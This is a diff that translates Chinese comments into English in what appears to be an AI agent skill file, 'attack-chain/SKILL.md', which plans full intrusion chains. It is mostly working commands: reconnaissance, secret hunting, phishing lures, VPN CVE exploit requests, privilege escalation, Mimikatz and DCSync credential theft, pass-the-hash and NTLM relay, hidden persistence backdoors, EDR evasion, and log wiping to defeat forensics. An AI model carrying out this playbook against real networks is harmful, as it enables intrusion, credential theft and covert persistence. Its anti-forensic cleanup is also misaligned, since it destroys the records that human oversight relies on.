@@ -51,37 +51,37 @@ The following scenarios **MUST** first go through this Skill for full-chain plan
 ### This Skill's Role
 
 ```
-用户提出多阶段任务
+User submits a multi-stage task
     ↓
-attack-chain/SKILL.md（本文件）
-    ↓ 规划攻击路径、确定阶段顺序
-    ↓ 评估每阶段所需工具和方法
+attack-chain/SKILL.md (this file)
+    ↓ Plan the attack path, determine phase order
+    ↓ Assess the tools and methods needed for each phase
     ↓
-分发到具体子 Skill 执行：
-    ├── pentest-tools/     → 工具调用、漏洞利用
-    ├── apk-reverse/       → 移动端渗透
-    ├── js-reverse/        → Web 前端突破
-    ├── reverse-engineering/ → 二进制分析
-    ├── ida-reverse/       → 深度逆向
-    └── browser-automation/ → 自动化操作
+Dispatch to specific sub-skills for execution:
+    ├── pentest-tools/     → tool invocation, vulnerability exploitation
+    ├── apk-reverse/       → mobile penetration testing
+    ├── js-reverse/        → web frontend breakthroughs
+    ├── reverse-engineering/ → binary analysis
+    ├── ida-reverse/       → deep reverse engineering
+    └── browser-automation/ → automated operations
     ↓
-每阶段完成后回到本 Skill 评估下一步
+After each phase completes, return to this Skill to assess the next step
     ↓
-全部完成 → docs-generator 生成报告
+All complete → docs-generator generates the report
 ```
 
 ### Attack Path Planning Decision Tree
 
 ```
-拿到目标后：
-1. 目标是什么？（Web/内网/云/移动/IoT）
-2. 当前有什么？（外部视角/已有凭据/已有据点）
-3. 最终目标是什么？（域控/数据/特定系统/证明影响）
-4. 约束条件？（时间/隐蔽性/不可触碰的系统）
+After acquiring the target:
+1. What is the target? (Web/internal network/cloud/mobile/IoT)
+2. What do we currently have? (external view/existing credentials/existing foothold)
+3. What is the final objective? (domain controller/data/specific systems/proving impact)
+4. What constraints? (time/stealth/untouchable systems)
     ↓
-根据以上信息规划最短路径
+Plan the shortest path based on the above information
     ↓
-一条路走不通 → 回到本 Skill 重新规划备选路径
+If one path fails → return to this Skill to re-plan an alternate path
 ```
 
 ---
@@ -95,17 +95,17 @@ attack-chain/SKILL.md（本文件）
 ### 1.1 Corporate Digital Asset Mapping
 
 ```bash
-# 子公司关联域名发现
+# Discover subsidiary-related domains
 subfinder -d target.com -o subdomains.txt
 amass enum -d target.com -passive -o amass_results.txt
 
-# 合并去重
+# Merge and deduplicate
 cat subdomains.txt amass_results.txt | sort -u > all_subs.txt
 
-# 存活探测
+# Liveness probing
 httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt
 
-# 端口扫描（全端口）
+# Port scan (all ports)
 naabu -l all_subs.txt -top-ports 1000 -o ports.txt
 nmap -sV -sC -iL targets.txt -oA nmap_results
 ```
@@ -118,7 +118,7 @@ nmap -sV -sC -iL targets.txt -oA nmap_results
 ### 1.2 Sensitive Information Leak Hunting
 
 ```bash
-# GitHub 搜索
+# GitHub search
 # org:Company filename:.env password
 # org:Company filename:config.yml secret
 # org:Company "jdbc:mysql" password
@@ -128,7 +128,7 @@ nmap -sV -sC -iL targets.txt -oA nmap_results
 # site:target.com inurl:admin
 # site:target.com ext:conf|cfg|ini
 
-# JS 文件中的 API Key
+# API keys in JS files
 cat js_urls.txt | while read url; do
   curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
 done
@@ -145,10 +145,10 @@ done
 
 **Social-engineering wordlist generation rules**:
 ```
-{姓名拼音}{年份}       → zhangsan2024
-{姓名首字母}{部门缩写}  → zs_dev
-{工号}@{域名}          → 10086@target.com
-{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#
+{pinyin name}{year}       → zhangsan2024
+{name initials}{department abbreviation}  → zs_dev
+{employee ID}@{domain}          → 10086@target.com
+{name}{common suffix}       → zhangsan@123, zhangsan!@#
 ```
 
 **Information sources**:
@@ -160,14 +160,14 @@ done
 ### 1.4 Tech Stack Fingerprinting
 
 ```bash
-# Web 指纹
+# Web fingerprinting
 whatweb -i alive.txt --log-json=fingerprint.json
 httpx -l alive.txt -tech-detect -json -o tech.json
 
-# 特定框架探测
+# Framework-specific detection
 nuclei -l alive.txt -tags tech -severity info -o tech_results.txt
 
-# CMS 识别
+# CMS identification
 wpscan --url https://target.com --enumerate p,t,u
 ```
 
@@ -188,13 +188,13 @@ wpscan --url https://target.com --enumerate p,t,u
 | XSS → Cookie | xsstrike | Admin session hijacking |
 
 ```bash
-# SQL 注入自动化
+# Automated SQL injection
 sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent
 
-# SSTI 检测
+# SSTI detection
 sstimap -u "https://target.com/search?q=test"
 
-# Nuclei 批量扫描
+# Nuclei batch scan
 nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 ```
 
@@ -215,11 +215,11 @@ nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 
 **Email phishing**:
 ```
-主题模板：
-- [紧急] VPN 证书即将过期，请立即更新
-- [IT通知] 邮箱存储空间不足，请清理
-- [HR] 2024年度绩效考核结果查询
-- [财务] 报销系统升级，请重新登录确认
+Subject templates:
+- [Urgent] VPN certificate expiring soon, update immediately
+- [IT Notice] Mailbox storage full, please clean up
+- [HR] 2024 annual performance review results
+- [Finance] Reimbursement system upgrade, please log in again to confirm
 ```
 
 **Payload types**:
@@ -245,37 +245,37 @@ nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 | Network implant | Raspberry Pi / LAN Turtle | Persistent internal network access point |
 
 ```bash
-# Fluxion WiFi 钓鱼
-fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码
+# Fluxion WiFi phishing
+fluxion  # Interactively select target AP → create rogue hotspot → capture WPA password
 
-# BadUSB 联动 Cobalt Strike
-# 通过 USB 注入 PowerShell 下载器 → 上线 C2
+# BadUSB combined with Cobalt Strike
+# Inject a PowerShell downloader via USB → connect to C2
 ```
 
 ### 2.5 VPN/Remote Access Breach
 
 ```bash
-# Pulse Secure VPN（CVE-2019-11510）
+# Pulse Secure VPN (CVE-2019-11510)
 curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"
 
-# Fortinet VPN（CVE-2018-13379）
+# Fortinet VPN (CVE-2018-13379)
 curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
 
-# 通用：密码喷洒
+# General: password spraying
 hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
 ```
 
 ### 2.6 Cloud Service Breach
 
 ```bash
-# AWS S3 桶枚举
+# AWS S3 bucket enumeration
 aws s3 ls s3://target-bucket --no-sign-request
 
-# 云元数据 SSRF
+# Cloud metadata SSRF
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-# Azure AD 密码喷洒
-# 使用 MSOLSpray / Spray 工具
+# Azure AD password spraying
+# Use the MSOLSpray / Spray tool
 ```
 
 ---
@@ -294,37 +294,37 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 | Scheduled tasks | Writable task scripts | Replace with schtasks |
 
 ```powershell
-# 检测 SeImpersonate
+# Detect SeImpersonate
 whoami /priv | findstr "SeImpersonate"
 
-# Potato 提权
+# Potato privilege escalation
 .\GodPotato.exe -cmd "cmd /c whoami"
 
-# 自动化检测
+# Automated detection
 .\winPEAS.exe
 ```
 
 ### 3.2 Linux Privilege Escalation
 
 ```bash
-# SUID 检测
+# SUID detection
 find / -perm -4000 -type f 2>/dev/null
 
-# sudo 滥用
+# sudo abuse
 sudo -l
-# 常见可利用：vim, find, python, nmap, less, awk, perl
+# Commonly exploitable: vim, find, python, nmap, less, awk, perl
 
-# sudo vim 提权
+# Privilege escalation via sudo vim
 sudo vim -c ':!/bin/bash'
 
-# sudo find 提权
+# Privilege escalation via sudo find
 sudo find / -exec /bin/bash \;
 
-# 内核漏洞
-uname -r  # 检查版本
+# Kernel exploits
+uname -r  # Check version
 # DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
 
-# 自动化检测
+# Automated detection
 ./linpeas.sh
 ```
 
@@ -336,7 +336,7 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 
--- MySQL UDF 提权
+-- MySQL UDF privilege escalation
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 SELECT sys_exec('id');
 
@@ -347,13 +347,13 @@ COPY (SELECT '') TO PROGRAM 'id';
 ### 3.4 Cloud Privilege Escalation
 
 ```bash
-# AWS IAM 枚举
+# AWS IAM enumeration
 aws iam list-attached-user-policies --user-name compromised-user
-# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限
+# Look for iam:PassRole + lambda:CreateFunction → admin rights
 
 # Azure AD
-# 全局管理员 → 所有订阅控制
-# 应用管理员 → 添加凭据到服务主体
+# Global admin → control over all subscriptions
+# Application admin → add credentials to service principals
 ```
 
 ---
@@ -363,23 +363,23 @@ aws iam list-attached-user-policies --user-name compromised-user
 ### 4.1 Credential Harvesting
 
 ```bash
-# Mimikatz（Windows）
+# Mimikatz (Windows)
 mimikatz# sekurlsa::logonpasswords
 mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt
 
-# Linux 凭据
+# Linux credentials
 cat /etc/shadow
 cat ~/.bash_history | grep -i pass
 find / -name "*.conf" -exec grep -l "password" {} \;
 
-# NTLM Hash 提取
+# NTLM hash extraction
 secretsdump.py domain/user:password@dc_ip
 ```
 
 ### 4.2 Pass-the-Hash / Pass-the-Ticket
 
 ```bash
-# PTH 横向
+# PTH lateral movement
 crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec
 
 # Kerberoasting
@@ -388,59 +388,59 @@ GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password
 # AS-REP Roasting
 GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
 
-# 金票据
+# Golden ticket
 mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
 ```
 
 ### 4.3 Stealthy Lateral Movement Techniques
 
 ```bash
-# WMI 无文件执行
+# WMI fileless execution
 wmiexec.py domain/admin:password@target_ip "whoami"
 
-# DCOM 远程执行
+# DCOM remote execution
 dcomexec.py domain/admin:password@target_ip "whoami"
 
 # WinRM
 evil-winrm -i target_ip -u admin -H <NTLM_HASH>
 
-# PsExec（会留痕）
+# PsExec (leaves traces)
 psexec.py domain/admin:password@target_ip
 
-# SSH 隧道（Linux 环境）
-ssh -D 1080 user@pivot_host  # SOCKS 代理
-ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
+# SSH tunneling (Linux environment)
+ssh -D 1080 user@pivot_host  # SOCKS proxy
+ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
 ```
 
 ### 4.4 NTLM Relay
 
 ```bash
-# 关闭 Responder 的 SMB/HTTP
-# 编辑 Responder.conf: SMB = Off, HTTP = Off
+# Disable Responder's SMB/HTTP
+# Edit Responder.conf: SMB = Off, HTTP = Off
 
-# 启动 Responder 捕获
+# Start Responder capture
 responder -I eth0
 
-# NTLM Relay 到目标
+# NTLM relay to the target
 ntlmrelayx.py -tf targets.txt -smb2support
 
-# Coercer 强制认证
+# Coercer forced authentication
 coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
 ```
 
 ### 4.5 AD Attack Paths
 
 ```bash
-# BloodHound 数据收集
+# BloodHound data collection
 bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip
 
-# 常见攻击路径：
-# 1. 用户 → GenericAll → 目标用户 → 重置密码
-# 2. 用户 → WriteDacl → 目标 OU → 添加权限
-# 3. 计算机 → 约束委派 → 模拟任意用户
-# 4. 用户 → DCSync 权限 → 导出所有 Hash
+# Common attack paths:
+# 1. User → GenericAll → target user → reset password
+# 2. User → WriteDacl → target OU → add permissions
+# 3. Computer → constrained delegation → impersonate any user
+# 4. User → DCSync rights → dump all hashes
 
-# Certipy AD CS 攻击
+# Certipy AD CS attack
 certipy find -u user@domain -p password -dc-ip dc_ip
 certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
 ```
@@ -462,7 +462,7 @@ certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
 | DSRM backdoor | Very high | Very high |
 
 ```powershell
-# WMI 事件订阅（高隐蔽）
+# WMI event subscription (highly stealthy)
 $Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
     Name = "CoreFilter"
     EventNameSpace = "root\cimv2"
@@ -470,28 +470,28 @@ $Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 }
 
-# 影子账户
+# Shadow account
 net user support$ P@ssw0rd /add /active:yes
 net localgroup administrators support$ /add
-# 修改注册表 F 值克隆 RID
+# Modify registry F value to clone RID
 ```
 
 ### 5.2 Linux Persistence
 
 ```bash
-# SSH 密钥植入
+# Plant SSH key
 echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
 
-# Crontab 后门
+# Crontab backdoor
 (crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -
 
-# LD_PRELOAD 劫持
+# LD_PRELOAD hijacking
 echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload
 
-# PAM 后门
-# 修改 pam_unix.so 添加万能密码
+# PAM backdoor
+# Modify pam_unix.so to add a universal password
 
-# Systemd 服务
+# Systemd service
 cat > /etc/systemd/system/update.service << 'EOF'
 [Unit]
 Description=System Update Service
@@ -507,14 +507,14 @@ systemctl enable update.service
 ### 5.3 Cloud Environment Persistence
 
 ```bash
-# AWS Lambda 后门
-# 创建定时触发的 Lambda 函数，回连 C2
+# AWS Lambda backdoor
+# Create a time-triggered Lambda function that calls back to C2
 
-# Azure AD 应用注册
-# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限
+# Azure AD app registration
+# Create app → add secret credentials → grant Graph API permissions
 
-# 容器后门
-# 修改基础镜像 → 所有新容器自带后门
+# Container backdoor
+# Modify the base image → all new containers ship with a backdoor
 ```
 
 ---
@@ -534,12 +534,12 @@ systemctl enable update.service
 ### 6.2 Practical Evasion Techniques
 
 ```
-1. Shellcode 加载器自定义（不用公开工具）
-2. 系统调用直接调用（绕过 ntdll hook）
-3. 进程注入选择低监控进程（如 RuntimeBroker.exe）
-4. C2 流量走 HTTPS + 域前置 / Cloudflare Workers
-5. 内存中执行，不落盘（Fileless）
-6. 利用合法签名程序加载（LOLBins）
+1. Custom shellcode loader (avoid public tools)
+2. Direct syscall invocation (bypass ntdll hooks)
+3. Choose a low-monitored process for injection (e.g., RuntimeBroker.exe)
+4. C2 traffic over HTTPS + domain fronting / Cloudflare Workers
+5. Execute in memory, never touch disk (fileless)
+6. Use legitimate signed programs to load (LOLBins)
 ```
 
 ### 6.3 C2 Framework Selection
@@ -557,23 +557,23 @@ systemctl enable update.service
 ## Phase 7: Trace Cleanup (Anti-Forensics)
 
 ```bash
-# Windows 日志清除
+# Clear Windows logs
 wevtutil cl Security
 wevtutil cl System
 wevtutil cl Application
 
-# Linux 日志清除
+# Clear Linux logs
 echo > /var/log/auth.log
 echo > /var/log/syslog
 history -c && history -w
 
-# 时间戳修改
+# Modify timestamps
 touch -t 202301010000 /path/to/file
 
-# 内存清理
-# 确保 Mimikatz dump 已删除
-# 确保 C2 beacon 已退出
-# 确保临时文件已清除
+# Memory cleanup
+# Make sure the Mimikatz dump is deleted
+# Make sure the C2 beacon has exited
+# Make sure temporary files are cleared
 ```
 
 ---
